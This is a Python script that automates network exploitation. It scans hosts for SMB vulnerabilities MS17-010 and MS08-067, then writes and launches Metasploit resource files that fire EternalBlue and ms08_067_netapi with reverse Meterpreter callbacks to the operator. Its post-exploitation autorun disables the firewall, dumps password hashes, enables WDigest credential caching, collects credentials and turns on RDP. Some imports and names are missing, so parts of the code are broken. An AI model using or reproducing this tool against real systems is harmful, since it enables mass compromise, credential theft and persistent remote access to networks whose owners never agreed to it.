#!/usr/bin/env python

import os
from subprocess import Popen, PIPE, CalledProcessError
import sys
from libnmap.process import NmapProcess
from libnmap.parser import NmapParser, NmapParserException
import netifaces
import argparse
from termcolor import colored
import time

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    return parser.parse_args()

# Colored terminal output
def print_bad(msg):
    print(colored('[-] ', 'red') + msg)

def print_info(msg):
    print(colored('[*] ', 'blue') + msg)

def print_good(msg):
    print(colored('[+] ', 'green') + msg)

def print_great(msg):
    print(colored('[!] {}'.format(msg), 'yellow', attrs=['bold']))

def parse_nmap(args):
    '''
    Either performs an Nmap scan or parses an Nmap xml file
    Will either return the parsed report or exit script
    '''
    if args.hostlist:
        hosts = []
        with open(args.hostlist, 'r') as hostlist:
            host_lines = hostlist.readlines()
            for line in host_lines:
                line = line.strip()
                try:
                    if '/' in line:
                        hosts += [str(ip) for ip in IPNetwork(line)]
                    elif '*' in line:
                        print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24')
                        sys.exit()
                    else:
                        hosts.append(line)
                except (OSError, AddrFormatError):
                    print_bad('Error importing host list file. Are you sure you chose the right file?')
                    sys.exit()

        report = nmap_scan(hosts)

    return report

def nmap_status_printer(nmap_proc):
    '''
    Prints that Nmap is running
    '''
    i = -1
    x = -.5
    while nmap_proc.is_running():
        i += 1
        # Every 30 seconds print that Nmap is still running
        if i % 30 == 0:
            x += .5
            print_info("Nmap running: {} min".format(str(x)))

        time.sleep(1)

def run_proc(cmd):
    '''
    Runs single commands
    ntlmrelayx needs the -c "powershell ... ..." cmd to be one arg tho
    '''
    cmd_split = cmd.split()
    print_info('Running: {}'.format(cmd))
    proc = Popen(cmd_split, stdout=STDOUT, stderr=STDOUT)

    return proc

def run_proc_xterm(cmd):
    '''
    Runs a process in an xterm window that doesn't die with icebreaker.py
    '''
    xterm_cmd = 'nohup xterm -hold -e {}'
    full_cmd = xterm_cmd.format(cmd)
    print_info('Running: {}'.format(full_cmd))
    # Split it only on xterm args, leave system command in 1 string
    cmd_split = full_cmd.split(' ', 4)
    # preexec_fn allows the xterm window to stay alive after closing script
    proc = Popen(cmd_split, stdout=PIPE, stderr=PIPE, preexec_fn=os.setpgrp)

    return proc

def nmap_scan(hosts):
    '''
    Do Nmap scan
    '''
    nmap_args = '-sS -T4 --script smb-vuln-ms17-010,smb-vuln-ms08-067 -n --max-retries 5 -p 445 -oA smb-scan'
    nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
    rc = nmap_proc.sudo_run_background()
    nmap_status_printer(nmap_proc)
    report = NmapParser.parse_fromfile(os.getcwd()+'/smb-scan.xml')

    return report

def get_hosts(args, report):
    '''
    Gets list of hosts with port 445 or 3268 (to find the DC) open
    and a list of hosts with smb signing disabled
    '''
    hosts = []

    print_info('Parsing hosts')
    for host in report.hosts:
        if host.is_up():
            # Get open services
            for s in host.services:
                if s.port == 445:
                    if s.state == 'open':
                        hosts.append(host)

    if len(hosts) == 0:
        print_bad('No hosts with port 445 open')
        sys.exit()

    return hosts

def get_vuln_hosts(hosts):
    '''
    Parse NSE scripts to find vulnerable hosts
    '''
    vuln_hosts = {}
    nse_scripts = ['smb-vuln-ms17-010', 'smb-vuln-ms08-067']

    for host in hosts:
        ip = host.address

        # Get SMB signing data
        for script_out in host.scripts_results:
            for script in nse_scripts:
                if script_out['id'] == script:
                    if 'State: VULNERABLE' in script_out['output']:
                        print_good('NSE script {} found vulnerable host: {}'.format(script, ip))
                        if vuln_hosts.get(ip):
                            vuln_hosts[ip].append(script)
                        else:
                            vuln_hosts[ip] = [script]

    return vuln_hosts

def get_local_ip(iface):
    '''
    Gets the the local IP of an interface
    '''
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip

def get_iface():
    '''
    Gets the right interface
    '''
    try:
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    except:
        ifaces = []
        for iface in netifaces.interfaces():
            # list of ipv4 addrinfo dicts
            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo') or addr.startswith('127.')):
                    ifaces.append(iface)

        iface = ifaces[0]

    return iface

def create_rc_file(vuln_hosts):
    local_ip = get_local_ip(get_iface())
    port = '443'

    # Create AutoRunScripts
    with open('autorun.rc', 'w') as ar:
        ar.write('run post/windows/manage/migrate\n'
                 'run post/windows/manage/killfw\n'
                 'run post/windows/gather/hashdump\n'
                 'run post/windows/manage/wdigest_caching\n'
                 'run post/windows/gather/credentials/credential_collector\n'
                 'run post/windows/manage/enable_rdp\n')

    # Start listener
    #start_handler_lines =  ('use exploit/multi/handler\n'
    #                        'set PAYLOAD windows/meterpreter/reverse_https\n'
    #                        'set LHOST {}\n'
    #                        'set LPORT {}\n'
    #                        'set ExitOnSession false\n'
    #                        'exploit -j -z\n'
    #                        'set AutoRunScript multi_console_command -rc autorun.rc\n'.format(local_ip, port))
    start_autorunscript =  ('set AutoRunScript multi_console_command -rc autorun.rc\n'.format(local_ip, port))

    # Exploit ms17-010
    ms17010_lines = ('use exploit/windows/smb/ms17_010_eternalblue\n'
                     'set RHOST {}\n'
                     'set MaxExploitAttempts 5\n'
                     'set payload windows/meterpreter/reverse_https\n'
                     'set LHOST {}\n'
                     'set LPORT {}\n'
                     'exploit -j -z\n')

    # Exploit ms08-067
    ms08067_lines = ('use exploit/windows/smb/ms08_067_netapi\n'
                     'set RHOST {}\n'
                     'set payload windows/meterpreter/reverse_https\n'
                     'set LHOST {}\n'
                     'set LPORT {}\n'
                     'exploit -j -z\n')

    with open('autopwn.rc', 'w') as f:
        f.write(start_autorunscript)
        for ip in vuln_hosts:
            for nse in vuln_hosts[ip]:
                if 'ms17-010' in nse:
                    f.write(ms17010_lines.format(ip, local_ip, port))
                elif 'ms08-067' in nse:
                    f.write(ms08067_lines.format(ip, local_ip, port))

def main(report, args):
    report = parse_nmap(args)
    hosts = get_hosts(args, report)
    vuln_hosts = get_vuln_hosts(hosts)
    create_rc_file(vuln_hosts)
    proc = run_proc_xterm('msfconsole -r autopwn.rc')

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid():
        print_bad('Run as root')
        sys.exit()
    report = parse_nmap(args)
    main(report, args)

